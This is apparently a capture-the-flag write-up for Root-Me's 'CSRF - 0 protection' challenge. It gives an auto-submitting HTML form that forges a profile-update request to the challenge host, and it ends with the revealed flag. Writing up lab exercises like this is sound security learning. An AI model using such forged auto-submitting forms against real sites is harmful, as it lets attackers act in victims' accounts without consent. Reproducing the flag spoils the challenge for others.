# CSRF - 0 protection

[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2FTienNHM%2Froot-me-ctf%2Ftree%2Fmaster%2FWeb-Client%2FCSRF%2520-%25200%2520protection&count_bg=%2379C83D&title_bg=%232D8FFF&icon=markdown.svg&icon_color=%23092753&title=Visitors&edge_flat=false)](https://hits.seeyoufarm.com)

/ch22/?action=contact

```html
<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
	<input type="text" name="username" value="user">
	<input type="checkbox" name="status" checked >
	<button type="submit">Submit</button>
</form>

<script>
	document.csrf_form.submit();
</script>
```

/ch22/?action=private
> Good job dude, flag is : Csrf_Fr33style-L3v3l1!
